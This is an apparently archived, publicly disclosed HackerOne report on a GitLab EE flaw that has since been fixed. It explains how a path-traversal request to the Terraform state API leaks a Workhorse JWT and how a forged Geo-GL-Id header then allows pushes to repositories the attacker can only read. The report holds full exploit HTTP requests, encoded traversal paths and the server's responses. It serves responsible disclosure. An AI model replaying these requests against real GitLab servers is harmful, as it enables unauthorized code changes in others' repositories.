---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authentication-generic
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
body: true
date: 2022-07-05
submitted: 2020-11-22T20:43:25.855Z
bounty_usd: 10000
votes: 36
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "ledz1996"
source: "https://hackerone.com/reports/1040786"
title: "Exposure of a valid Gitlab-Workhorse JWT leading to various bad things"
---
# Exposure of a valid Gitlab-Workhorse JWT leading to various bad things

> **Severity:** High | **Bounty:** 10,000 USD | **Votes:** 36 | **Program:** GitLab | **Disclosed:** 2022-07-05

- Report: [https://hackerone.com/reports/1040786](https://hackerone.com/reports/1040786)
- CWE: Improper Authentication - Generic
- Submitted: 2020-11-22T20:43:25.855Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Summary

Using the **State** Uploading API we could potentially do a bad thing:
- Bypass `Gitlab::Workhorse.verify_api_request!`

This was due to the fact that Workhorse clean the URL before passing it to Rails, this is elaborated in #923027. 
and **State** Api read `request.body` to append it as a file!

**lib/api/terraform/state.rb**
```ruby
 desc 'Add a new terraform state or update an existing one'
          route_setting :authentication, basic_auth_personal_access_token: true, job_token_allowed: :basic_auth
          post do
            authorize! :admin_terraform_state, user_project

            data = request.body.read
```
There is one very interestingly specific exploit which I've found in my researching on Geo is to un-authorizing push to any readable repository
Since Gitlab has a pre-receive hook which check the permission even if attacker is able to bypass the Access Control in Rails part but here is pretty interesting stuff in EE:

**ee/app/controllers/ee/repositories/git_http_controller.rb**
```ruby
def user
        super || geo_push_user&.user
      end

      def geo_push_user
        @geo_push_user ||= ::Geo::PushUser.new_from_headers(request.headers)
      end
```
Which mean the `user` for passing to Gitaly will be `user` from `geo_push_user`

```ruby
  def self.new_from_headers(headers)
    return unless needed_headers_provided?(headers)

    new(headers['Geo-GL-Id'])
  end

  def user
    @user ||= identify_using_ssh_key(gl_id)
  end
```

Tracing from this we will reach here

```ruby
    def identify_using_ssh_key(identifier)
      key_id = identifier.gsub("key-", "")

      identify_with_cache(:ssh_key, key_id) do
        User.find_by_ssh_key_id(key_id)
      end
    end

```
This means: I am able to authenticate as any **SSH-KEY** by just passing the ID of the Key to headers `Geo-GL-Id`

### Steps to reproduce

Spliting into 2 parts, **GEO** is not neccessary for the PoC but **EE** Plan should be.

**Exposing Gitlab JWT**

- Set up an Project
- Get a Personal Access Token of the user
- Send the following request 

```http
POST /api/v4/projects/<project-id>/terraform/state/%2e%2e%2f%2e%2e%2fwikis%2fattachments?serial=1 HTTP/1.1
Host: gitlab3.example.vm
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0
Private-Token: <private-token>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTdc8IV2vpQMwv6jW
Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzBOVE14T1RWbUxXRTBZalF0TkRBek1pMWhaVGRpTFRNM05tSTBNalExWlRjNVl5ST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--64479e11c45d9e17bdf950f749ab3fa8b3ee278a; _gitlab_session=b50156c1d05716e1bebbfd448f38b890; known_sign_in=SkJhSDV0MWRqaFAyaFpZQlNCM3Vqbmg5UkxsZ0hyTHVWSlNPanNZT2YxbVQ4M2xvaUxLNkZabE9zeHdZOHlFQnloTWJxWGdPMWtKbUlkV25TNGFHRFFQVDlpdTRtUFpnTnZyd2xCTk5sS2hNRVBmODEvc2RiYVovT2RjTWgzWFQtLTY4ZEl1bXA4ZnVETVFrYnUrZVhaR1E9PQ%3D%3D--34ce6946f382229b6135333906ad3fd10ecbb284; sidebar_collapsed=false; event_filter=all
Upgrade-Insecure-Requests: 1
Content-Length: 316

------WebKitFormBoundaryTdc8IV2vpQMwv6jW
Content-Disposition: form-data; name="import_url"

http://gitlab3.example.vm/test/ttt
------WebKitFormBoundaryTdc8IV2vpQMwv6jW
Content-Disposition: form-data; name="mirror"; filename=test.txt
Content-Type: image/jpg

true
------WebKitFormBoundaryTdc8IV2vpQMwv6jW--
```

3. Later on send the following request 

```http
GET /api/v4/projects/6/terraform/state/%2e%2e%2f%2e HTTP/1.1
Host: gitlab3.example.vm
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0
Private-Token: <Private-Token>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzBOVE14T1RWbUxXRTBZalF0TkRBek1pMWhaVGRpTFRNM05tSTBNalExWlRjNVl5ST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--64479e11c45d9e17bdf950f749ab3fa8b3ee278a; _gitlab_session=b50156c1d05716e1bebbfd448f38b890; known_sign_in=SkJhSDV0MWRqaFAyaFpZQlNCM3Vqbmg5UkxsZ0hyTHVWSlNPanNZT2YxbVQ4M2xvaUxLNkZabE9zeHdZOHlFQnloTWJxWGdPMWtKbUlkV25TNGFHRFFQVDlpdTRtUFpnTnZyd2xCTk5sS2hNRVBmODEvc2RiYVovT2RjTWgzWFQtLTY4ZEl1bXA4ZnVETVFrYnUrZVhaR1E9PQ%3D%3D--34ce6946f382229b6135333906ad3fd10ecbb284; sidebar_collapsed=false; event_filter=all
Upgrade-Insecure-Requests: 1

```

You will then receive something like this which the JWT is in `mirror.gitlab-workhorse-upload` parameter

```http
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 22 Nov 2020 17:45:01 GMT
Connection: close
Cache-Control: max-age=0, private, must-revalidate
Etag: W/"2db9b0c1229e01c96956b4ed4ed32f3d"
Vary: Origin
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Request-Id: wNp4wblZQ42
X-Runtime: 0.119849
Strict-Transport-Security: max-age=31536000
Referrer-Policy: strict-origin-when-cross-origin
Content-Length: 2540

--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="import_url"

http://gitlab3.example.vm/test/ttt
--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.name"

test.txt
--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.path"

/opt/gitlab/embedded/service/gitlab-rails/public/uploads/tmp/test.txt403239251
--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.md5"

b326b5062b2f0e69046810717534cb09
--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.sha256"

b5bea41b6c623f7c09f1bf24dcae58ebab3c0cdd90ad966bc43a45b44867e12b
--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.gitlab-workhorse-upload"

[REDACTED-JWT]
--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.remote_id"


--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.size"

4
--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.remote_url"


--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.sha512"

9120cd5faef07a08e971ff024a3fcbea1e3a6b44142a6d82ca28c6c42e4f852595bcf53d81d776f10541045abdb7c37950629415d0dc66c8d86c64a5606d32de
--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a
Content-Disposition: form-data; name="mirror.sha1"

5ffe533b830f08a0326348a9160afafc8ada44db
--066cee44c4789c36d4ad90b076a0073a796e913814dc64d9afb57f77869a--

```

Take note of this value

**Unauthorizing push to readable project**
Assuming:

User B has Project B set public or internal without any user can push.
User B upload an SSH-KEY.

- Login as another user.
- Navigate to project B that you don't have the push access.
- Fork the project
- Clone the forked project using HTTP
- Push any file to the Project but intercept the request

When sending the request to `<project-forked-path>.git/git-receive-pack`
Change the path from  `<project-forked-path>.git/git-receive-pack` to `/-/push_from_secondary/2/<project-path>.git/git-upload-pack.t%2f%2e%2e%2fgit-receive-pack `
Adding the `Gitlab-Workhorse-Api-Request` Header with the value is the value noted in the first part
Adding the `Geo-GL-Id` with the value `key-<id>` with `<id>` as the ID of any key of a user who has push access to the project which is user B, This could be brute-forced as it is incremental integer from 1.
The request should look likes

```http
POST /-/push_from_secondary/2/rrr/dsds.git/git-upload-pack.t%2f%2e%2e%2fgit-receive-pack HTTP/1.1
Host: gitlab3.example.vm
Geo-GL-Id: key-1
User-Agent: git/2.28.0
Accept-Encoding: gzip, deflate
Gitlab-Workhorse-Api-Request: [REDACTED-JWT]
Content-Type: application/x-git-receive-pack-request
Accept: application/x-git-receive-pack-result
Content-Length: 436
Connection: close

00a822cc76ea883341147a10ad83f9994bb9a89d79d9 02c1e26f4d449d265e87e2906933ff0a2a5f275d refs/heads/master report-status side-band-64k object-format=sha1 agent=git/2.28.00000PACKxËA
B!Ð½§póõ;Dtö-gt¢ óc
uûºBÛotU[" q(IYÐ«EsE¨dÌ(´*Ù¸ësØeÉ£rJÞKòW"
"Ä
R!ÃsÜZ·6»=sU{ø´yÒ7×í¡ûÜêÑBtÑ!ø°ÚCçÌOë}ý³¡¯a¾kå=ÕúsVOæme²6
Az^×ÿÜTx*Õÿ»Ó lll2332.txt¨'FÛN^ÁÎZÐpå}Í"¶Ü¿³ÐÌHt!4x+))á"gøÈÎ.LG^gßygßÿæ5,
```

Video:
Sorry had to tone down the size because of 256 mb limit :( 

{F1090024}

###Results of GitLab environment info

```
System information
System:     Ubuntu 16.04
Proxy:      no
Current User:   git
Using RVM:  no
Ruby Version:   2.6.6p146
Gem Version:    2.7.10
Bundler Version:1.17.3
Rake Version:   12.3.3
Redis Version:  5.0.9
Git Version:    2.28.0
Sidekiq Version:5.2.9
Go Version: unknown

GitLab information
Version:    13.5.3-ee
Revision:   b9d194b6b91
Directory:  /opt/gitlab/embedded/service/gitlab-rails
DB Adapter: PostgreSQL
DB Version: 11.9
URL:        http://gitlab.example.vm
HTTP Clone URL: http://gitlab.example.vm/some-group/some-project.git
SSH Clone URL:  git@gitlab.example.vm:some-group/some-project.git
Elasticsearch:  no
Geo:        no
Using LDAP: no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:    13.11.0
Repository storage paths:
- default:  /var/opt/gitlab/git-data/repositories
GitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell
Git:        /opt/gitlab/embedded/bin/git
```

## Impact

Unauthorized push to repositories, exposing Workhorse JWT

## Timeline

- **Report Filed**
- **2020-11-22** @gitlab-securitybot: Hi @ledz1996,

Thank you for submitting this report! We will investigate the issue as soon as
possible, and should get back within a week.

Please do not submit your report or ask about its status through additional
channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **2020-11-23** @ledz1996: Oh, for internal-visibility project,
please add a valid `Authorization` Header in the last step

```http
POST /-/push_from_secondary/2/rrr/dsds.git/git-upload-pack.t%2f%2e%2e%2fgit-receive-pack HTTP/1.1
Host: gitlab3.example.vm
Geo-GL-Id: key-1
User-Agent: git/2.28.0
Authorization: Basic <Base64 of any valid user:password>
Accept-Encoding: gzip, deflate
Gitlab-Workhorse-Api-Request: [REDACTED-JWT]
Content-Type: application/x-git-receive-pack-request
Accept: application/x-git-receive-pack-result
Content-Length: 436
Connection: close

00a822cc76ea883341147a10ad83f9994bb9a89d79d9 02c1e26f4d449d265e87e2906933ff0a2a5f275d refs/heads/master report-status side-band-64k object-format=sha1 agent=git/2.28.00000PACKxËA
B!Ð½§póõ;Dtö-gt¢ óc
uûºBÛotU[" q(IYÐ«EsE¨dÌ(´*Ù¸ësØeÉ£rJÞKòW"
"Ä
R!ÃsÜZ·6»=sU{ø´yÒ7×í¡ûÜêÑBtÑ!ø°ÚCçÌOë}ý³¡¯a¾kå=ÕúsVOæme²6
Az^×ÿÜTx*Õÿ»Ó lll2332.txt¨'FÛN^ÁÎZÐpå}Í"¶Ü¿³ÐÌHt!4x+))á"gøÈÎ.LG^gßygßÿæ5,
```
- **2020-11-23** @ledz1996: Please let me know if you need any help in reproducing the vuln.Thanks
- **2020-11-25** @ledz1996: If you guys want I could PoC it on 1 of the public repositories in https://gitlab.com, I just need a Key ID of a user who can push or I could just brute force it.
- **2020-11-25** @ledz1996: Hi team, I just need a little update if there is any. Thanks you :(
- **2020-11-26** @ledz1996: This is partially due to the fact that 
- It is possible to pass data for gitaly to recognize as `git-receive-pack` as long as `workhorse` recognize the routes as `git-receive-pack`. This is achievable by appending `.%2f%2E%2Egit-receive-pack`, rails will recognize this as `param[:format]`  but due to Path cleaning by `workhorse`, this will be passed to gitaly as `git-receive-pack`
- However, the access check for rail would be for `git-upload-pack`. Initially there was no way to bypass the Access Check in `gitaly-hook`. But `Geo-Gl-ID` allow us to change the `user` in the data sent to Workhorse.
- **Report Severity Updated**
- **Report Vulnerability Types Updated**
- **Report Triaged**
- **Bounty Awarded**
- **2020-12-02** @gitlab-securitybot: ETA for fix:

Hi @ledz1996,

The issue you reported is currently scheduled to be fixed by 2020-12-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2020-12-16** @gitlab-securitybot: ETA for fix:

Hi @ledz1996,

The issue you reported is currently scheduled to be fixed by 2021-01-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Bounty Awarded**
- **2021-03-02** @gitlab-securitybot: ETA for fix:

Hi @ledz1996,

The issue you reported is currently scheduled to be fixed by 2021-03-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Report Resolved**
- **Agreed On Going Public**
- **2021-05-24** @ledz1996: Hi @dcouture, could you bear waiting for me a little bit before disclosing this, I'm writing a post about this, could be nice that this is disclosed within tbe day the blog post is finished, haha.
Thank you!
- **2021-05-25** @dcouture: No problem @ledz1996

Feel free to drop a link to the blog post when you accept the disclosure!
- **Agreed On Going Public**
- **Report Became Public**
